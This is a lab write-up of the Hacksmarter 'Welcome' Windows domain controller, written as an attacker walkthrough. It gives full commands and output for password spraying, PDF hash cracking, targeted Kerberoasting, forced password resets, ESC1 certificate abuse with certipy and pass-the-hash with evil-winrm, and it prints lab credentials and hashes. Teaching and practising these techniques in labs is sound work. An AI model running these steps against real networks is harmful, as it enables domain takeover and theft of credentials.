# Welcome

![welcome](../assets/images/welcome.png)

```
**`This is a writeup for the Hacksmarter Lab machine: Welcome`**

- IP Address: ``10.1.93.173``
- Difficulty: Easy
- Operating System: Windows
- Assumed Breach Creds: e.hills:Il0vemyj0b2025!
```

## Enumeration Using Nmap
```bash
nmap -A 10.1.93.173 --unprivilege -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-13 15:34 -0800
Nmap scan report for 10.1.93.173
Host is up (0.033s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-13 23:35:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.WELCOME.local
| Not valid before: 2025-09-13T16:39:47
|_Not valid after:  2026-09-13T16:39:47
|_ssl-date: 2025-11-13T23:36:44+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-13T23:36:44+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.WELCOME.local
| Not valid before: 2025-09-13T16:39:47
|_Not valid after:  2026-09-13T16:39:47
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-13T23:36:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.WELCOME.local
| Not valid before: 2025-09-13T16:39:47
|_Not valid after:  2026-09-13T16:39:47
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-13T23:36:44+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.WELCOME.local
| Not valid before: 2025-09-13T16:39:47
|_Not valid after:  2026-09-13T16:39:47
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-13T23:36:44+00:00; +1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: WELCOME
|   NetBIOS_Domain_Name: WELCOME
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: WELCOME.local
|   DNS_Computer_Name: DC01.WELCOME.local
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-13T23:36:04+00:00
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Not valid before: 2025-10-27T15:46:43
|_Not valid after:  2026-04-28T15:46:43
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-13T23:36:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.30 seconds
```

## SMB Enumeration
e.hills user do have READ access to the DC01 shared drive

```bash
 nxc smb 10.1.93.173 -u e.hills -p 'Il0vemyj0b2025!' --shares
SMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.93.173     445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
SMB         10.1.93.173     445    DC01             [*] Enumerated shares
SMB         10.1.93.173     445    DC01             Share           Permissions     Remark
SMB         10.1.93.173     445    DC01             -----           -----------     ------
SMB         10.1.93.173     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.93.173     445    DC01             C$                              Default share
SMB         10.1.93.173     445    DC01             Human Resources READ
SMB         10.1.93.173     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.93.173     445    DC01             NETLOGON        READ            Logon server share
SMB         10.1.93.173     445    DC01             SYSVOL          READ            Logon server share
```

`smbclient.py` will be used from the impacket suite of tools to login to the `Human Resource` share folder.

```bash
dcyberguy on  ~/Documents/Hacksmarter-labs/Welcome
# dir

    Directory: C:\Users\dcyberguy\Documents\Hacksmarter-labs\Welcome

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          11/13/2025  4:36 PM          84715 Welcome 2025 Holiday Schedule.pdf
-a---          11/13/2025  4:36 PM          81466 Welcome Benefits.pdf
-a---          11/13/2025  4:37 PM          82644 Welcome Handbook Excerpts.pdf
-a---          11/13/2025  4:37 PM          79823 Welcome Performance Review Guide.pdf
-a---          11/13/2025  4:37 PM          89511 Welcome Start Guide.pdf
```

Welcome Start Guide.pdf is password protected so I will use **pdf2john** to crack the password

```bash
pdf2john Welcome\ Start\ Guide.pdf > john.pass
➜  welcome ls
       john.pass        Welcome Start Guide.pdf 
➜  welcome cat john.pass
Welcome Start Guide.pdf:$pdf$4*4*128*-1060*1*16*fc591b1749ad08498b60ce3a81947b8c*32*9abeeb4695a10ac7b5e6558d39ee8c8300000000000000000000000000000000*32*e3e7eecc056a1ca2a2b0298352b0970f96ff1503022a1146e322e2f215dfd6be
➜  welcome sudo john --wordlist=/usr/share/wordlists/rockyou.txt john.pass
[sudo] password for parrot: 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
humanresources   (Welcome Start Guide.pdf)     
1g 0:00:00:05 DONE (2025-11-20 17:37) 0.1675g/s 155529p/s 155529c/s 155529C/s hunkies..huitar
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed. 
➜  welcome open Welcome\ Start\ Guide.pdf
```

[**password is `humanresources`**]

On the Human resource document, there is a default password every new employee gets after on-boarding. This password would later be changed. Let’s see whether any of the users changed his password.

![alt text](../assets/images/welcome-2.png)

I will list all users using nxc and cut out only the users. This users would be stored in a file called users.txt

```bash
nxc smb 10.1.93.173 -u e.hills -p 'Il0vemyj0b2025!' --users 
SMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.93.173     445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025! 
SMB         10.1.93.173     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                             
SMB         10.1.93.173     445    DC01             Administrator                 2025-09-13 16:24:04 0       Built-in account for administering the computer/domain 
SMB         10.1.93.173     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.93.173     445    DC01             krbtgt                        2025-09-13 16:40:39 0       Key Distribution Center Service Account 
SMB         10.1.93.173     445    DC01             e.hills                       2025-09-13 20:41:15 0        
SMB         10.1.93.173     445    DC01             j.crickets                    2025-09-13 20:43:53 0        
SMB         10.1.93.173     445    DC01             e.blanch                      2025-09-13 20:49:13 0        
SMB         10.1.93.173     445    DC01             i.park                        2025-09-14 04:23:03 0       IT Intern 
SMB         10.1.93.173     445    DC01             j.johnson                     2025-09-13 20:58:15 0        
SMB         10.1.93.173     445    DC01             a.harris                      2025-09-13 20:59:13 0        
SMB         10.1.93.173     445    DC01             svc_ca                        2025-09-14 00:19:35 0        
SMB         10.1.93.173     445    DC01             svc_web                       2025-09-13 21:40:40 0       Web Server in Progress 
SMB         10.1.93.173     445    DC01             [*] Enumerated 11 local users: WELCOME

```

Save the users list to a file
```shell
cat users.txt | cut -d ' ' -f 5
Administrator
Guest
krbtgt
e.hills
j.crickets
e.blanch
i.park
j.johnson
a.harris
svc_ca

```

Bruteforce for user with default password and also check whether it has remote services enabled

```bash
nxc smb 10.1.93.173 -u users.txt -p 'Welcome2025!@'
SMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\Administrator:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\Guest:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\krbtgt:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\e.hills:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\j.crickets:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\e.blanch:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\i.park:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [-] WELCOME.local\j.johnson:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.93.173     445    DC01             [+] WELCOME.local\a.harris:Welcome2025!@ 

➜  welcome nxc smb 10.1.93.173 -u a.harris -p 'Welcome2025!@'
SMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.93.173     445    DC01             [+] WELCOME.local\a.harris:Welcome2025!@ 

➜  welcome nxc winrm 10.1.93.173 -u a.harris -p 'Welcome2025!@'
WINRM       10.1.93.173     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local)
WINRM       10.1.93.173     5985   DC01             [+] WELCOME.local\a.harris:Welcome2025!@ (Pwn3d!)

```

Use the obtained password and login to the compromised user’s account.

```shell
welcome evil-winrm -i 10.1.93.173 -u a.harris -p 'Welcome2025!@'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a.harris\Documents> dir
*Evil-WinRM* PS C:\Users\a.harris\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\a.harris\Desktop> dir


    Directory: C:\Users\a.harris\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2025   8:48 PM             32 user.txt


*Evil-WinRM* PS C:\Users\a.harris\Desktop> type user.txt
46fa545e76f2bXXXXXXXXXXXXXX

```
Looking at the user privileges, it seems I can do `CVE-2021-42278` which allows potential attackers to gain high privileged user access (domain controllers Administrator level access) via a low privileged user (any normal Domain user). But it failed since the dir is **0**.

```shell
noPac git:(main) python3 noPac.py welcome.local/a.harris:'Welcome2025!@' -dc-ip 10.1.93.173 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[-] Cannot exploit , ms-DS-MachineAccountQuota 0

```

WinPeas did not work either. It was caught by the antivirus.

```shell
*Evil-WinRM* PS C:\Windows\Temp> ./winPEASx64.exe
Program 'winPEASx64.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ ./winPEASx64.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./winPEASx64.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

### Bloodhound
**`Bloodhound`** was last resort and I found some interesting thing about the user **`a.harris`**

```shell
nxc ldap 10.1.93.173 -u a.harris -p 'Welcome2025!@' --bloodhound --collection All --dns-server 10.1.93.173
SMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
LDAP        10.1.93.173     389    DC01             [+] WELCOME.local\a.harris:Welcome2025!@ 
LDAP        10.1.93.173     389    DC01             Resolved collection methods: objectprops, group, acl, psremote, container, session, trusts, dcom, localadmin, rdp
LDAP        10.1.93.173     389    DC01             Done in 00M 04S
LDAP        10.1.93.173     389    DC01             Compressing output into /home/parrot/.nxc/logs/DC01_10.1.93.173_2025-11-20_203317_bloodhound.zip

```

Fired up Bloodhound

```shell
./bloodhound-cli up
[+] Checking the status of Docker and the Compose plugin...
[+] The `compose` plugin is not installed, so we'll try the deprecated `docker-compose` script
[+] The `docker-compose` script is installed, so we'll use that instead
[+] Docker and the Compose plugin checks have passed
[+] Bringing up the BloodHound environment
[+] Running `docker-compose` to bring up the containers with /home/parrot/.config/bloodhound/docker-compose.yml...
Starting bloodhound_graph-db_1 ... 
Starting bloodhound_app-db_1   ... 
Starting bloodhound_graph-db_1 ... done
Starting bloodhound_app-db_1   ... done
Starting bloodhound_bloodhound_1 ... 
Starting bloodhound_bloodhound_1 ... done

```
A.HARRIS has Genric.All over I.PARK user which would enable us to do a targetedKerberoast attack

[targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

![alt text](../assets/images/welcome-1.png)

### Exploit: TargetedKerberoast
```shell
targetedKerberoast git:(main) python3 targetedKerberoast.py -d WELCOME.local -u 'a.harris' -p 'Welcome2025!@' -v 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (i.park)
[+] Printing hash for (i.park)
$krb5tgs$23$*i.park$WELCOME.LOCAL$WELCOME.local/i.park*$27d2977ce568aadf149bc88472e0e3bd$170de14225152619c806cd2284dd653e547a0c039900365a238821c2411e123e9a83c6dc785ad58dc8db5ba55ca257da0facca60d80810328823dbb779caf2f3d102b9cf78f1cf489c5cb3e221443c87dd572a8986a8f97721be8ca18d27d613b04f5cc5b7f35af2a0bd53dac6d9a73244235fd7347ed762bd330b6305b22ddecd30c0b4fdc07b54640595d89cfe8c57db9b0bc77dc927bdf2314f3b4e903a9ae46c012a1bf3c128c660978423375d05246e7323d6ea23f1d38ccb02301d94127ee47f2df8ed2a1c5ae51077e4beb5f26406e013974c2d93bfd557f98f2dc2684c5351f22c6b684f5574836527f66e4fc4f5311cca9dee775c6cf3d2b478dcac4b4396bd4d44aec09a59213f18a7cc4a650906d7d02a72df02d434bd94b77a55fa3e5f29209cfef07b414d4d998ca57af76fa1f6984f71f85dc57092555e4b349f5d0ba17328f065299783b42a62a79b3abb26bdad451b55a09c05e16a3d2ec956976df3ae288caaa0b1d2cd7397fc33ecfff3d241dc8ac4d03923701f3b9a81fe769278bdf44857dc34f52738e6008877910f7374ab24789abcbbe1ea9d79e465882fe73ef0d09b58918f037972382109bdd50adb4f0e67e83422e6fa522c95aa85549b30952461e55b4995b6cd98ed041f6bb666addacb373e9d11f350c687ec645711ac0e489dfeca6011053f192a1260b3f0e29cc91c454d9ed1618c54a95b9af0f19337e21bdf9871452f9bc636976b9ea9dd84d2687f6269448a4f9235214b582cb89407f049169713b5e6d00ad1900dec55be9b738c16dd0d9df5c7d699e7e397e445ee06bd12b4aa80ffbabf89ae66637cdc61437d432b66c019123a3e4a1e665022f543b06d78e6fd7d03b7aa233e37d96a2e181c11d823cd49c0327eb94b7f2e4831ee6af338db24a6749712701277adef921d5d0fb4cf6076e56f024a284a59fcb024753060edba811f7d3c83d5617b14226bebbbd758b84808822ea22289c921e1e4e2556b7cc32bb1bfb3d42d58731873c9f7485cfb3c17fe15fe10ec5005ea631c18fd78df2b82d01879d09c939d2d060352595e70e07d89f01199a4638ffd365a2195d6ea23d373ad254be979a7d9e754a608b7cab5f26990be7a50236fb1a29fb3536e2bc62d99a31b0308c86827fc04669dc2e68a10b8b8c3f5f0593e254eb9919d7326add150ffdf1d1b58a36d6ee19e1b0c25bd34dad75d7937a1ccd6ddd52451f2f4852c94c25361076d7f91d50b2fb05e14302b378cf0bc511723d84f321fc23fa4285e06181981a65209e8d1aa966424c18964f43b30d58bc8a9a75fbc8c9d43c276c415bfa31f9b986f9ae70130a5368568cb0fef12b45644a2293006d818aba87561cb58a2e8e478e6a68868a696d73808db0c41344fb1bd4e3827da20770908ad8872598a0dc663c014670de45e45d4ea64b5a6497318154cf8eaafab12db02b835a9d96b756beb6d5d
[VERBOSE] SPN removed successfully for (i.park)

```

I tried cracking the keberoast hash with John The Ripper. It Failed Woefully

```shell
john --list:formats | grep krb5
[sudo] password for parrot: 
keyring, keystore, known_hosts, krb4, krb5, krb5asrep, krb5pa-sha1, krb5tgs, 
krb5-17, krb5-18, krb5-3, kwallet, lp, lpcli, leet, lotus5, lotus85, LUKS, 
mscash2, MSCHAPv2, mschapv2-naive, krb5pa-md5, mssql, mssql05, mssql12, 
416 formats (149 dynamic formats shown as just "dynamic_n" here)

➜  ~ cd Documents/HSM-Labs/welcome 

➜  welcome nano kerb.hash

➜  welcome sudo john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:08 DONE (2025-11-20 21:18) 0g/s 1728Kp/s 1728Kc/s 1728KC/s !!12Honey..*7¡Vamos!
Session completed. 

➜  welcome sudo john kerb.hash -show
0 password hashes cracked, 1 left

```
We can also do a **`Force Password Change`**. I was able to change **`i.park’s`** password and he is able to do an **`RDP Session`**

```shell
net rpc password "i.park" "Valentino1@" -U "WELCOME.local"/"a.harris"%'Welcome2025!@' -S "10.1.93.173"

➜  welcome nxc smb 10.1.93.173 -u i.park -p 'Valentino1@'
SMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)
SMB         10.1.93.173     445    DC01             [+] WELCOME.local\i.park:Valentino1@ 

➜  welcome nxc winrm 10.1.93.173 -u i.park -p 'Valentino1@'
WINRM       10.1.93.173     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local)
WINRM       10.1.93.173     5985   DC01             [-] WELCOME.local\i.park:Valentino1@

➜  welcome nxc rdp 10.1.93.173 -u i.park -p 'Valentino1@'
RDP         10.1.93.173     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:WELCOME.local) (nla:True)
RDP         10.1.93.173     3389   DC01             [+] WELCOME.local\i.park:Valentino1@ 
```

Now that I have compromised **`i.park`**, what else can I do. Since Park is a member of the **`HelpDesk group`**, he can force a password change on both **`SVC_CA`** and **`SVC_WEB`**. Guess my next mark, you got ir SVC_CA.

## Privilege Escalation

### Certipy-ad

Since this is all above Certificates, I will check whether it contains a vulnerable certificate

```jsx
certipy find -u svc_ca -p 'Valentino1@' -dc-ip 10.1.93.173 -target-ip 10.1.93.173 -vulnerable -enable -stdout
/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'WELCOME-CA' via CSRA
[!] Got error while trying to get CA configuration for 'WELCOME-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'WELCOME-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'WELCOME-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : WELCOME-CA
    DNS Name                            : DC01.WELCOME.local
    Certificate Subject                 : CN=WELCOME-CA, DC=WELCOME, DC=local
    Certificate Serial Number           : 6E7A025A45F4E6A14E1F08B77737AFD9
    Certificate Validity Start          : 2025-09-13 16:39:33+00:00
    Certificate Validity End            : 2030-09-13 16:49:33+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : WELCOME.LOCAL\Administrators
      Access Rights
        ManageCertificates              : WELCOME.LOCAL\Administrators
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        ManageCa                        : WELCOME.LOCAL\Administrators
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        Enroll                          : WELCOME.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Welcome-Template
    Display Name                        : Welcome-Template
    Certificate Authorities             : WELCOME-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : WELCOME.LOCAL\svc ca
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : WELCOME.LOCAL\Administrator
        Write Owner Principals          : WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
                                          WELCOME.LOCAL\Administrator
        Write Dacl Principals           : WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
                                          WELCOME.LOCAL\Administrator
        Write Property Principals       : WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
                                          WELCOME.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'WELCOME.LOCAL\\svc ca' can enroll, enrollee supplies subject and template allows client authentication

```

Yes it is vulnerable to ESCI1. 

Dumping the `administrator.pfx`

```jsx
certipy req -username svc_ca@WELCOME.local -password 'Valentino1@' -target-ip WELCOME.local -dc-ip 10.1.93.173 -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.local'
/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 23
[*] Got certificate with UPN 'administrator@WELCOME.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

I can get a `ldap shell`

```jsx
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip 10.1.93.173
/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.1.93.173:636'
[*] Authenticated to '10.1.93.173' as: u:WELCOME\Administrator
Type help for list of commands

# whoami
u:WELCOME\Administrator

```

Or I can also dump the administrator’s password hash

```jsx
certipy auth -pfx administrator.pfx -u administrator -domain WELCOME.local  -dc-ip 10.1.93.173
/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@welcome.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a
```

Instead of me trying to crack it, I can just use the `LM hash` and authenticate to `evil-winrm`

```jsx
evil-winrm -i 10.1.93.173 -u administrator -H '0cf1b799460a39c852068b7c0574677a'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2025   5:47 PM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
7fbb500e36XXXXXXXXXXXXXXXXXXXX

```